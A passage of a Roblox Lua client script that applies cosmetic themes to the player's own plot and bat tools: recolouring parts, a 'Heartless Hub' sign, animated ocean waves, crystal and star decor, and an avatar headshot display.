        primary   = Color3.fromRGB(200, 230, 245),
        secondary = Color3.fromRGB(170, 210, 235),
        accent    = Color3.fromRGB(235, 245, 255),
        dark      = Color3.fromRGB(55, 85, 110),
        glass     = Color3.fromRGB(220, 240, 255),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.Glass,
        reflectance = 0.04,
        glassRefl = 0.15,
    },
    Diamond = {
        primary   = Color3.fromRGB(170, 230, 255),
        secondary = Color3.fromRGB(130, 200, 245),
        accent    = Color3.fromRGB(220, 250, 255),
        dark      = Color3.fromRGB(35, 75, 110),
        glass     = Color3.fromRGB(200, 240, 255),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.Glass,
        reflectance = 0.15,
        glassRefl = 0.35,
    },
    Ocean = {
        primary   = Color3.fromRGB(15, 90, 170),
        secondary = Color3.fromRGB(10, 55, 130),
        accent    = Color3.fromRGB(30, 160, 210),
        dark      = Color3.fromRGB(5, 25, 55),
        glass     = Color3.fromRGB(70, 190, 240),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.Glass,
        reflectance = 0.03,
        glassRefl = 0.2,
    },
    Stars = {
        primary   = Color3.fromRGB(40, 20, 55),
        secondary = Color3.fromRGB(25, 10, 40),
        accent    = Color3.fromRGB(90, 40, 120),
        dark      = Color3.fromRGB(12, 8, 18),
        glass     = Color3.fromRGB(120, 70, 180),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.Glass,
        reflectance = 0.08,
        glassRefl = 0.25,
    },
    Romania = {
        -- Romania flag: blue, yellow, red
        primary   = Color3.fromRGB(0, 43, 127),   -- blue
        secondary = Color3.fromRGB(206, 17, 38),  -- red
        accent    = Color3.fromRGB(252, 209, 22), -- yellow
        dark      = Color3.fromRGB(20, 25, 50),
        glass     = Color3.fromRGB(252, 209, 22),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.SmoothPlastic,
        reflectance = 0,
        glassRefl = 0,
        romania   = true,
    },
    Sakura = {
        primary   = Color3.fromRGB(255, 160, 200),
        secondary = Color3.fromRGB(255, 120, 180),
        accent    = Color3.fromRGB(255, 200, 220),
        dark      = Color3.fromRGB(90, 40, 70),
        glass     = Color3.fromRGB(255, 210, 230),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.SmoothPlastic,
        reflectance = 0.02,
        glassRefl = 0,
    },
    Gold = {
        primary   = Color3.fromRGB(255, 200, 50),
        secondary = Color3.fromRGB(220, 160, 20),
        accent    = Color3.fromRGB(255, 230, 120),
        dark      = Color3.fromRGB(90, 60, 10),
        glass     = Color3.fromRGB(255, 220, 100),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.SmoothPlastic,
        reflectance = 0.12,
        glassRefl = 0.1,
    },
    Rainbow = {
        -- special: colors cycle by index
        primary   = Color3.fromRGB(255, 80, 80),
        secondary = Color3.fromRGB(80, 255, 120),
        accent    = Color3.fromRGB(80, 140, 255),
        dark      = Color3.fromRGB(30, 30, 40),
        glass     = Color3.fromRGB(255, 255, 255),
        material  = Enum.Material.SmoothPlastic,
        darkMat   = Enum.Material.SmoothPlastic,
        glassMat  = Enum.Material.SmoothPlastic,
        reflectance = 0,
        glassRefl = 0,
        rainbow   = true,
    },
}

local RAINBOW_COLORS = {
    Color3.fromRGB(255, 60, 60),
    Color3.fromRGB(255, 140, 40),
    Color3.fromRGB(255, 220, 50),
    Color3.fromRGB(60, 220, 80),
    Color3.fromRGB(50, 180, 255),
    Color3.fromRGB(120, 80, 255),
    Color3.fromRGB(255, 90, 200),
}

local function getMyPlot()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end

    -- 1) YourBase billboard enabled
    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") and yb.Enabled then
                return plot
            end
        end
        if isMyPlotByName and isMyPlotByName(plot.Name) then
            return plot
        end
    end

    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if not sign then continue end
        for _, d in ipairs(sign:GetDescendants()) do
            if d:IsA("TextLabel") and type(d.Text) == "string" then
                local t = d.Text
                if t:find(LP.DisplayName, 1, true) or t:find(LP.Name, 1, true) then
                    return plot
                end
            end
        end
    end

    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        local best, bestD = nil, math.huge
        for _, plot in ipairs(plots:GetChildren()) do
            local p = plot:FindFirstChildWhichIsA("BasePart", true)
            if p then
                local d = (p.Position - root.Position).Magnitude
                if d < bestD then bestD, best = d, plot end
            end
        end
        if best and bestD < 120 then
            return best
        end
    end
    return nil
end

-- Rename local plot sign text to "Ocean User"
local function applyOceanUserSign(plot)
    plot = plot or (getMyPlot and getMyPlot())
    if not plot then return end
    local sign = plot:FindFirstChild("PlotSign")
    if not sign then return end
    for _, d in ipairs(sign:GetDescendants()) do
        if d:IsA("TextLabel") or d:IsA("TextBox") then
            local t = tostring(d.Text or "")
            if t:find("Base") or t:find(LP.DisplayName, 1, true) or t:find(LP.Name, 1, true) or t:find("Octavian") then
                pcall(function() d.Text = "Ocean User" end)
            end
        end
    end
end

local function startOceanUserSignWatch()
    task.spawn(function()
        while true do
            task.wait(2)
            pcall(function()
                local plot = getMyPlot and getMyPlot()
                if plot then applyOceanUserSign(plot) end
            end)
        end
    end)
end
startOceanUserSignWatch()

local function shouldSkipBasePart(part)
    if not part or not part:IsA("BasePart") then return true end

    local p = part
    while p and p ~= workspace do
        local n = string.lower(tostring(p.Name or ""))
        if n == "animalpodiums" or n == "animals" or n == "brainrots" or n == "pets" then
        end
        if p:IsA("Model") then
            local parent = p.Parent
            if parent and string.lower(tostring(parent.Name or "")) == "animalpodiums" then
                return true -- this is an animal/brainrot model
            end
            if Players:GetPlayerFromCharacter(p) then
                return true
            end
        end
        if p:IsA("Tool") or p:IsA("Accessory") or p:IsA("Hat") then
            return true
        end
        -- name hints for brainrot models
        if n:find("brainrot") or n:find("animal") and p:IsA("Model") then
            local parent = p.Parent
            if parent and string.lower(tostring(parent.Name or "")):find("podium") then
                return true
            end
        end
        p = p.Parent
    end

    local n = string.lower(part.Name or "")
    if n:find("humanoid") or n:find("rootpart") then return true end
    if part:FindFirstChildOfClass("Humanoid") then return true end
    if part.Parent and part.Parent:FindFirstChildOfClass("Humanoid") then return true end

    local anc = part:FindFirstAncestor("AnimalPodiums")
    if anc then
        local parentModel = part:FindFirstAncestorOfClass("Model")
        if parentModel and parentModel ~= anc and parentModel.Parent == anc then
            return true -- animal model under AnimalPodiums
        end
        if parentModel and parentModel.Parent and parentModel.Parent.Parent == anc then
            return true
        end
    end

    return false
end

local function saveBasePartColor(part)
    if baseColorSaved[part] ~= nil then return end
    pcall(function()
        baseColorSaved[part] = {
            Color = part.Color,
            Material = part.Material,
            Transparency = part.Transparency,
            Reflectance = part.Reflectance,
        }
    end)
end

local function restoreBaseColors()
    for part, data in pairs(baseColorSaved) do
        if part and part.Parent and part:IsA("BasePart") then
            pcall(function()
                part.Color = data.Color
                part.Material = data.Material
                if data.Transparency ~= nil then part.Transparency = data.Transparency end
                if data.Reflectance ~= nil then part.Reflectance = data.Reflectance end
            end)
        end
    end
    baseColorSaved = {}
end

local function applyThemeToPart(part, theme, index)
    if shouldSkipBasePart(part) then return end
    saveBasePartColor(part)
    local sz = part.Size
    local vol = sz.X * sz.Y * sz.Z
    local isFrame = (sz.X < 1.2 or sz.Z < 1.2 or sz.Y < 0.6) and vol < 40
    local isGlass = part.Transparency > 0.15 and part.Transparency < 0.95
    local isFloor = sz.Y < 1.5 and (sz.X > 8 or sz.Z > 8)

    pcall(function()
        if isGlass then
            return
        elseif isFrame or isFloor then
            part.Color = theme.dark
            part.Material = theme.darkMat or Enum.Material.SmoothPlastic
            part.Reflectance = 0
            if part.Transparency < 1 then part.Transparency = 0 end
        else
            local col
            if theme.rainbow then
                col = RAINBOW_COLORS[((index or 0) % #RAINBOW_COLORS) + 1]
            else
                local pick = (index or 0) % 3
                if pick == 0 then col = theme.primary
                elseif pick == 1 then col = theme.secondary
                else col = theme.accent end
            end
            part.Color = col
            part.Material = theme.material or Enum.Material.SmoothPlastic
            part.Reflectance = theme.reflectance or 0
            if part.Transparency < 1 then part.Transparency = 0 end
        end
    end)
end

local function clearBaseHubSign()
    if _G.__baseHubSign then
        pcall(function() _G.__baseHubSign:Destroy() end)
        _G.__baseHubSign = nil
    end
    if _G.__baseHubSign2 then
        pcall(function() _G.__baseHubSign2:Destroy() end)
        _G.__baseHubSign2 = nil
    end
    local plot = getMyPlot and getMyPlot()
    if plot then
        for _, d in ipairs(plot:GetDescendants()) do
            if d.Name == "OceanHubSurface" or d.Name == "OceanHubSign" or d.Name == "WaveEmojiGui" then
                pcall(function() d:Destroy() end)
            end
        end
    end

    if _G.__baseWaveFolder then
        pcall(function() _G.__baseWaveFolder:Destroy() end)
        _G.__baseWaveFolder = nil
    end
    if _G.__baseWaveConn then
        pcall(function() _G.__baseWaveConn:Disconnect() end)
        _G.__baseWaveConn = nil
    end
end

local function createBaseHubSign(plot)
    clearBaseHubSign()
    if not plot then return end

    local best, bestScore = nil, -1
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            local sz = d.Size
            -- tall-ish vertical face preferred
            local score = 0
            if sz.Y >= 3 then score = score + sz.Y * 2 end
            if sz.X >= 4 or sz.Z >= 4 then score = score + math.max(sz.X, sz.Z) end
            if sz.Y < 1.5 then score = score - 20 end -- skip floors
            if score > bestScore then
                bestScore = score
                best = d
            end
        end
    end
    if not best then best = plot:FindFirstChildWhichIsA("BasePart", true) end
    if not best then return end

    local face = Enum.NormalId.Front
    if best.Size.X >= best.Size.Z then
        face = Enum.NormalId.Right
    end

    local sg = Instance.new("SurfaceGui")
    sg.Name = "OceanHubSurface"
    sg.Face = face
    sg.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
    sg.PixelsPerStud = 35
    sg.Parent = best

    local bg = Instance.new("Frame")
    bg.Name = "BG"
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(10, 40, 80)
    bg.BackgroundTransparency = 0.35
    bg.BorderSizePixel = 0
    bg.Parent = sg

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, -6, 0.55, 0)
    title.Position = UDim2.new(0, 3, 0.05, 0)
    title.BackgroundTransparency = 1
    title.Text = "Heartless Hub"
    title.Font = Enum.Font.GothamBlack
    title.TextScaled = true
    title.TextColor3 = Color3.fromRGB(80, 220, 255)
    title.TextStrokeTransparency = 0.15
    title.TextStrokeColor3 = Color3.fromRGB(0, 30, 70)
    title.Parent = bg

    local sub = Instance.new("TextLabel")
    sub.Name = "Subtitle"
    sub.Size = UDim2.new(1, -6, 0.32, 0)
    sub.Position = UDim2.new(0, 3, 0.62, 0)
    sub.BackgroundTransparency = 1
    sub.Text = "Octavian and David"
    sub.Font = Enum.Font.GothamMedium
    sub.TextScaled = true
    sub.TextColor3 = Color3.fromRGB(180, 235, 255)
    sub.TextStrokeTransparency = 0.35
    sub.Parent = bg

    local sg2 = sg:Clone()
    if face == Enum.NormalId.Front then
        sg2.Face = Enum.NormalId.Back
    elseif face == Enum.NormalId.Right then
        sg2.Face = Enum.NormalId.Left
    else
        sg2.Face = Enum.NormalId.Front
    end
    sg2.Parent = best

    _G.__baseHubSign = sg -- store gui; clearBaseHubSign will destroy it + clone
    _G.__baseHubSign2 = sg2
end

local function createOceanWaves(plot)
    if _G.__baseWaveFolder then
        pcall(function() _G.__baseWaveFolder:Destroy() end)
        _G.__baseWaveFolder = nil
    end
    if _G.__baseWaveConn then
        pcall(function() _G.__baseWaveConn:Disconnect() end)
        _G.__baseWaveConn = nil
    end
    -- clean old emoji guis left on walls
    for _, d in ipairs(plot:GetDescendants()) do
        if d.Name == "WaveEmojiGui" or d.Name == "OceanHubSurface" or d.Name == "WaveEmojiBoard" then
            pcall(function() d:Destroy() end)
        end
    end

    local folder = Instance.new("Folder")
    folder.Name = "OceanBaseWaves"
    folder.Parent = workspace
    _G.__baseWaveFolder = folder

    local center = Vector3.zero
    local count = 0
    local minY = math.huge
    local maxX, maxZ = 8, 8
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            center = center + d.Position
            count = count + 1
            local b = d.Position.Y - d.Size.Y * 0.5
            if b < minY then minY = b end
        end
    end
    if count > 0 then center = center / count end
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            maxX = math.max(maxX, math.abs(d.Position.X - center.X) + d.Size.X * 0.5)
            maxZ = math.max(maxZ, math.abs(d.Position.Z - center.Z) + d.Size.Z * 0.5)
        end
    end
    if minY == math.huge then minY = center.Y end

    -- SAND under base
    local sand = Instance.new("Part")
    sand.Name = "OceanSand"
    sand.Anchored = true
    sand.CanCollide = false
    sand.Material = Enum.Material.Sand
    sand.Color = Color3.fromRGB(225, 195, 135)
    sand.Size = Vector3.new(maxX * 2.6, 1.3, maxZ * 2.6)
    sand.Position = Vector3.new(center.X, minY - 0.45, center.Z)
    sand.Parent = folder

    for i = 1, 4 do
        local a = (i / 4) * math.pi * 2
        local p = Instance.new("Part")
        p.Name = "SandPatch"
        p.Anchored = true
        p.CanCollide = false
        p.Material = Enum.Material.Sand
        p.Color = Color3.fromRGB(215 + i * 4, 175, 115 + i * 3)
        p.Size = Vector3.new(5 + i, 0.9, 5 + i)
        p.Position = Vector3.new(center.X + math.cos(a) * (maxX * 1.05), minY - 0.15, center.Z + math.sin(a) * (maxZ * 1.05))
        p.Parent = folder
    end

    local waveParts = {}
    for ring = 1, 3 do
        local radius = math.max(maxX, maxZ) * 0.75 + ring * 3.2
        local segments = 8 + ring * 2
        for i = 0, segments - 1 do
            local mid = ((i + 0.5) / segments) * math.pi * 2
            local x = center.X + math.cos(mid) * radius
            local z = center.Z + math.sin(mid) * radius
            local len = radius * (2 * math.pi / segments) * 0.9
            local part = Instance.new("Part")
            part.Name = "Wave"
            part.Anchored = true
            part.CanCollide = false
            part.Material = Enum.Material.SmoothPlastic
            part.Color = Color3.fromRGB(25 + ring * 25, 130 + ring * 18, 215)
            part.Transparency = 0.15 + ring * 0.1
            part.Size = Vector3.new(math.max(len, 2), 0.75, 2)
            part.CFrame = CFrame.new(x, minY + 0.7, z) * CFrame.Angles(0, -mid + math.pi * 0.5, 0)
            part.Parent = folder
            table.insert(waveParts, {part = part, baseY = minY + 0.5 + ring * 0.1, phase = mid + ring, radius = radius, mid = mid})
        end
    end

    local t0 = tick()
    _G.__baseWaveConn = RunService.Heartbeat:Connect(function()
        if baseThemeMode ~= "Ocean" then return end
        local t = tick() - t0
        for _, w in ipairs(waveParts) do
            if w.part and w.part.Parent then
                local y = w.baseY + math.sin(t * 2.4 + w.phase) * 0.5
                local x = center.X + math.cos(w.mid + t * 0.1) * w.radius
                local z = center.Z + math.sin(w.mid + t * 0.1) * w.radius
                pcall(function()
                    w.part.CFrame = CFrame.new(x, y, z)
                        * CFrame.Angles(0, -(w.mid + t * 0.1) + math.pi * 0.5, math.sin(t * 2 + w.phase) * 0.12)
                end)
            end
        end
    end)
end

local BAT_AVATAR_USER = "Octavian112299"
local function createBatDecor(plot)
    if _G.__baseBatFolder then
        pcall(function() _G.__baseBatFolder:Destroy() end)
        _G.__baseBatFolder = nil
    end
    for _, d in ipairs(plot:GetDescendants()) do
        if d.Name == "BatAvatarGui" or d.Name == "BatDecor" then
            pcall(function() d:Destroy() end)
        end
    end

    local folder = Instance.new("Folder")
    folder.Name = "OceanBatDecor"
    folder.Parent = workspace
    _G.__baseBatFolder = folder

    local center = Vector3.zero
    local count = 0
    local minY, maxY = math.huge, -math.huge
    local maxX, maxZ = 8, 8
    local walls = {}
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            center = center + d.Position
            count = count + 1
            local b = d.Position.Y - d.Size.Y * 0.5
            local t = d.Position.Y + d.Size.Y * 0.5
            if b < minY then minY = b end
            if t > maxY then maxY = t end
            if d.Size.Y >= 2.5 then table.insert(walls, d) end
        end
    end
    if count > 0 then center = center / count end
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            maxX = math.max(maxX, math.abs(d.Position.X - center.X) + d.Size.X * 0.5)
            maxZ = math.max(maxZ, math.abs(d.Position.Z - center.Z) + d.Size.Z * 0.5)
        end
    end
    if minY == math.huge then minY = center.Y end
    if maxY == -math.huge then maxY = center.Y + 12 end
    local midY = (minY + maxY) * 0.5
    local topY = maxY + 1.5

    local function wedgeCrystal(cf, size, col)
        local p = Instance.new("WedgePart")
        p.Name = "BatDecor"
        p.Anchored = true
        p.CanCollide = false
        p.Material = Enum.Material.Glass
        p.Color = col
        p.Transparency = 0.25
        p.Reflectance = 0.35
        p.Size = size
        p.CFrame = cf
        p.Parent = folder
        return p
    end

    local function diamondPart(cf, size, col)
        local p = Instance.new("Part")
        p.Name = "BatDecor"
        p.Anchored = true
        p.CanCollide = false
        p.Material = Enum.Material.Glass
        p.Color = col
        p.Transparency = 0.2
        p.Reflectance = 0.4
        p.Size = size
        p.CFrame = cf * CFrame.Angles(0, 0, math.rad(45))
        p.Parent = folder
        return p
    end

    local function starPart(cf, scale, col)
        -- simple 3-part star cross
        local folder2 = Instance.new("Model")
        folder2.Name = "BatDecor"
        folder2.Parent = folder
        for _, ang in ipairs({0, 60, 120}) do
            local p = Instance.new("Part")
            p.Name = "BatDecor"
            p.Anchored = true
            p.CanCollide = false
            p.Material = Enum.Material.Neon
            p.Color = col
            p.Size = Vector3.new(scale * 2.2, scale * 0.35, scale * 0.35)
            p.CFrame = cf * CFrame.Angles(0, 0, math.rad(ang))
            p.Parent = folder2
        end
    end

    local crystalCols = {
        Color3.fromRGB(180, 220, 255),
        Color3.fromRGB(200, 160, 255),
        Color3.fromRGB(140, 200, 255),
        Color3.fromRGB(255, 200, 255),
    }
    local starCols = {
        Color3.fromRGB(255, 230, 120),
        Color3.fromRGB(200, 180, 255),
        Color3.fromRGB(255, 255, 255),
    }

    -- crystals around perimeter
    for i = 0, 9 do
        local a = (i / 10) * math.pi * 2
        local r = math.max(maxX, maxZ) * 0.85
        local x = center.X + math.cos(a) * r
        local z = center.Z + math.sin(a) * r
        local h = 2 + (i % 3) * 1.2
        wedgeCrystal(
            CFrame.new(x, minY + h * 0.5, z) * CFrame.Angles(0, -a, 0),
            Vector3.new(1.2, h, 1.4),
            crystalCols[(i % #crystalCols) + 1]
        )
        if i % 2 == 0 then
            diamondPart(
                CFrame.new(x, minY + h + 1.2, z),
                Vector3.new(1.1, 1.1, 1.1),
                crystalCols[((i + 1) % #crystalCols) + 1]
            )
        end
    end

    -- stars floating above / on sides
    for i = 0, 7 do
        local a = (i / 8) * math.pi * 2 + 0.2
        local r = math.max(maxX, maxZ) * 0.55
        local x = center.X + math.cos(a) * r
        local z = center.Z + math.sin(a) * r
        starPart(
            CFrame.new(x, maxY + 1.5 + (i % 3) * 0.8, z),
            0.7 + (i % 3) * 0.15,
            starCols[(i % #starCols) + 1]
        )
    end

    -- diamond accents on top corners
    for i = 0, 3 do
        local a = (i / 4) * math.pi * 2 + math.pi * 0.25
        local r = math.max(maxX, maxZ) * 0.7
        diamondPart(
            CFrame.new(center.X + math.cos(a) * r, maxY + 0.8, center.Z + math.sin(a) * r),
            Vector3.new(1.4, 1.4, 1.4),
            Color3.fromRGB(200, 240, 255)
        )
    end

    task.spawn(function()
        local userId = nil
        pcall(function()
            userId = Players:GetUserIdFromNameAsync(BAT_AVATAR_USER)
        end)
        if not userId then
            pcall(function()
                userId = Players:GetUserIdFromNameAsync("octavian112299")
            end)
        end
        if not userId then
            warn("[Bat Theme] Could not resolve " .. BAT_AVATAR_USER)
            return
        end

        local thumb = string.format(
            "rbxthumb://type=AvatarHeadShot&id=%d&w=420&h=420",
            userId
        )

        local bestWall, bestScore = nil, -math.huge
        for _, wall in ipairs(walls) do
            local score = wall.Size.Y * 2 + wall.Size.X + wall.Size.Z
            score = score - (wall.Position.Z - center.Z) * 0.5
            if score > bestScore then
                bestScore = score
                bestWall = wall
            end
        end

        if bestWall then
            -- clear old
            for _, c in ipairs(bestWall:GetChildren()) do
                if c.Name == "BatAvatarGui" then pcall(function() c:Destroy() end) end
            end
            local face = Enum.NormalId.Front
            -- choose largest face roughly
            if bestWall.Size.X > bestWall.Size.Z then
                face = Enum.NormalId.Right
            end
            local sg = Instance.new("SurfaceGui")
            sg.Name = "BatAvatarGui"
            sg.Face = face
            sg.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
            sg.PixelsPerStud = 45
            sg.Parent = bestWall
            local img = Instance.new("ImageLabel")
            img.Size = UDim2.fromScale(1, 1)
            img.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
            img.BackgroundTransparency = 0.3
            img.BorderSizePixel = 0
            img.Image = thumb
            img.ScaleType = Enum.ScaleType.Fit
            img.Parent = sg
        else
            -- fallback: one board in front only
            local part = Instance.new("Part")
            part.Name = "BatDecor"
            part.Anchored = true
            part.CanCollide = false
            part.Material = Enum.Material.SmoothPlastic
            part.Color = Color3.fromRGB(20, 10, 35)
            local boardH = math.clamp((maxY - minY) * 0.45, 4, 9)
            part.Size = Vector3.new(boardH * 0.75, boardH, 0.3)
            part.CFrame = CFrame.new(center.X, midY, center.Z - maxZ - 1.2)
            part.Parent = folder
            local sg = Instance.new("SurfaceGui")
            sg.Name = "BatAvatarGui"
            sg.Face = Enum.NormalId.Front
            sg.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
            sg.PixelsPerStud = 45
            sg.Parent = part
            local img = Instance.new("ImageLabel")
            img.Size = UDim2.fromScale(1, 1)
            img.BackgroundTransparency = 0.3
            img.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
            img.Image = thumb
            img.ScaleType = Enum.ScaleType.Fit
            img.Parent = sg
        end
    end)

-- gentle spin on neon stars
    local t0 = tick()
    _G.__baseBatConn = RunService.Heartbeat:Connect(function()
        if baseThemeMode ~= "Stars" then return end
        local t = tick() - t0
        for _, d in ipairs(folder:GetDescendants()) do
            if d:IsA("BasePart") and d.Material == Enum.Material.Neon then
                pcall(function()
                    local pos = d.Position
                    d.CFrame = CFrame.new(pos) * CFrame.Angles(0, t * 1.2, t * 0.8)
                end)
            end
        end
    end)
end

local function clearBatDecor()
    if _G.__baseBatFolder then
        pcall(function() _G.__baseBatFolder:Destroy() end)
        _G.__baseBatFolder = nil
    end
    if _G.__baseBatConn then
        pcall(function() _G.__baseBatConn:Disconnect() end)
        _G.__baseBatConn = nil
    end
end

local batThemeMode = "Normal"  -- Normal | Avatar | Neon | Gold | Dark | Crystal | Fire
local batThemeConns = {}
local BAT_AVATAR_NAME = "Octavian112299"
local batThemeThumb = nil

local BAT_TOOL_THEMES = {
    Normal   = nil,
    Avatar   = { color = Color3.fromRGB(50, 25, 70), material = Enum.Material.SmoothPlastic, useAvatar = true },
    Neon     = { color = Color3.fromRGB(190, 50, 255), material = Enum.Material.Neon, useAvatar = false, particles = "neon" },
    Gold     = { color = Color3.fromRGB(255, 200, 40), material = Enum.Material.SmoothPlastic, useAvatar = false, reflectance = 0.45 },
    Dark     = { color = Color3.fromRGB(15, 15, 20), material = Enum.Material.SmoothPlastic, useAvatar = false },
    Crystal  = { color = Color3.fromRGB(150, 220, 255), material = Enum.Material.ForceField, useAvatar = false, reflectance = 0.5 },
    Fire     = { color = Color3.fromRGB(255, 80, 15), material = Enum.Material.Neon, useAvatar = false, particles = "fire" },
    Ice      = { color = Color3.fromRGB(140, 220, 255), material = Enum.Material.Glass, useAvatar = false, reflectance = 0.35 },
    Toxic    = { color = Color3.fromRGB(80, 255, 40), material = Enum.Material.Neon, useAvatar = false, particles = "neon" },
    Blood    = { color = Color3.fromRGB(140, 10, 20), material = Enum.Material.SmoothPlastic, useAvatar = false },
    Galaxy   = { color = Color3.fromRGB(60, 30, 140), material = Enum.Material.Neon, useAvatar = false, particles = "neon" },
    White    = { color = Color3.fromRGB(245, 245, 255), material = Enum.Material.SmoothPlastic, useAvatar = false, reflectance = 0.2 },
    Rainbow  = { color = Color3.fromRGB(255, 80, 180), material = Enum.Material.Neon, useAvatar = false, particles = "neon", rainbow = true },
    -- +10 extra themes
    Ocean    = { color = Color3.fromRGB(20, 140, 220), material = Enum.Material.Glass, useAvatar = false, reflectance = 0.3 },
    Sunset   = { color = Color3.fromRGB(255, 120, 60), material = Enum.Material.Neon, useAvatar = false, particles = "fire" },
    Mint     = { color = Color3.fromRGB(90, 255, 190), material = Enum.Material.SmoothPlastic, useAvatar = false },
    Void     = { color = Color3.fromRGB(8, 0, 18), material = Enum.Material.SmoothPlastic, useAvatar = false },
    Cyber    = { color = Color3.fromRGB(0, 255, 200), material = Enum.Material.Neon, useAvatar = false, particles = "neon" },
    Rose     = { color = Color3.fromRGB(255, 90, 140), material = Enum.Material.SmoothPlastic, useAvatar = false, reflectance = 0.15 },
    Amber    = { color = Color3.fromRGB(255, 170, 30), material = Enum.Material.Neon, useAvatar = false },
    Shadow   = { color = Color3.fromRGB(40, 40, 55), material = Enum.Material.Metal, useAvatar = false, reflectance = 0.25 },
    Plasma   = { color = Color3.fromRGB(180, 40, 255), material = Enum.Material.Neon, useAvatar = false, particles = "neon" },
    Chrome   = { color = Color3.fromRGB(200, 210, 220), material = Enum.Material.Metal, useAvatar = false, reflectance = 0.7 },
}
local BAT_THEME_ORDER = {
    "Normal","Avatar","Neon","Gold","Dark","Crystal","Fire","Ice","Toxic","Blood","Galaxy","White","Rainbow",
    "Ocean","Sunset","Mint","Void","Cyber","Rose","Amber","Shadow","Plasma","Chrome",
}

local function resolveBatThemeThumb()
    if batThemeThumb then return batThemeThumb end
    local userId = nil
    pcall(function() userId = Players:GetUserIdFromNameAsync(BAT_AVATAR_NAME) end)
    if not userId then pcall(function() userId = Players:GetUserIdFromNameAsync("octavian112299") end) end
    if userId then
        batThemeThumb = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=420&h=420", userId)
    end
    return batThemeThumb
end

local function getBatTools()
    local list = {}
    local char = LP.Character
    if char then
        for _, t in ipairs(char:GetChildren()) do
            if t:IsA("Tool") and t.Name:lower():find("bat") then
                table.insert(list, t)
            end
        end
    end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") and t.Name:lower():find("bat") then
                table.insert(list, t)
            end
        end
    end
    return list
end

local function stripBatThemeFromTool(tool)
    if not tool then return end
    for _, d in ipairs(tool:GetDescendants()) do
        if d.Name == "BatThemeDecal" or d.Name == "BatThemeGui"
            or d.Name == "BatThemeHighlight" or d.Name == "BatThemeParticles"
            or d.Name == "OctavianBatSkin" or d.Name == "OctavianBatDecal" then
            pcall(function() d:Destroy() end)
        end
    end
    for _, part in ipairs(tool:GetDescendants()) do
        if part:IsA("BasePart") and part:GetAttribute("BatThemeSaved") then
            pcall(function()
                local c = part:GetAttribute("BatThemeOrigColor")
                if c then part.Color = c end
                local m = part:GetAttribute("BatThemeOrigMat")
                if m ~= nil then
                    pcall(function()
                        if typeof(m) == "EnumItem" then
                            part.Material = m
                        elseif type(m) == "string" and Enum.Material[m] then
                            part.Material = Enum.Material[m]
                        end
                    end)
                end
                local tr = part:GetAttribute("BatThemeOrigTrans")
                if tr ~= nil then part.Transparency = tr end
                local rf = part:GetAttribute("BatThemeOrigRefl")
                if rf ~= nil then part.Reflectance = rf end
                local tex = part:GetAttribute("BatThemeOrigTex")
                if tex ~= nil and part:IsA("MeshPart") then
                    part.TextureID = tex
                end
                part:SetAttribute("BatThemeSaved", nil)
            end)
        end
    end
end

local function clearBatToolTheme()
    for _, c in ipairs(batThemeConns) do
        pcall(function() c:Disconnect() end)
    end
    batThemeConns = {}
    for _, tool in ipairs(getBatTools()) do
        stripBatThemeFromTool(tool)
    end
end

local function savePartOriginals(part)
    if part:GetAttribute("BatThemeSaved") then return end
    pcall(function()
        part:SetAttribute("BatThemeOrigColor", part.Color)
        part:SetAttribute("BatThemeOrigMat", part.Material.Name)
        part:SetAttribute("BatThemeOrigTrans", part.Transparency)
        part:SetAttribute("BatThemeOrigRefl", part.Reflectance)
        if part:IsA("MeshPart") then
            part:SetAttribute("BatThemeOrigTex", part.TextureID or "")
        end
        part:SetAttribute("BatThemeSaved", true)
    end)
end

local function applyBatThemeToTool(tool)
    if not tool or not tool:IsA("Tool") then return end
    if not tool.Name:lower():find("bat") then return end

    local theme = BAT_TOOL_THEMES[batThemeMode]
    if not theme or batThemeMode == "Normal" then
        stripBatThemeFromTool(tool)
        return
    end

    for _, d in ipairs(tool:GetDescendants()) do
        if d.Name == "BatThemeDecal" or d.Name == "BatThemeGui"
            or d.Name == "BatThemeHighlight" or d.Name == "BatThemeParticles"
            or d.Name == "OctavianBatSkin" or d.Name == "OctavianBatDecal" then
            pcall(function() d:Destroy() end)
        end
    end

    local handle = tool:FindFirstChild("Handle") or tool:FindFirstChildWhichIsA("BasePart")

    -- recolor EVERY part in the bat
    for _, part in ipairs(tool:GetDescendants()) do
        if part:IsA("BasePart") then
            savePartOriginals(part)
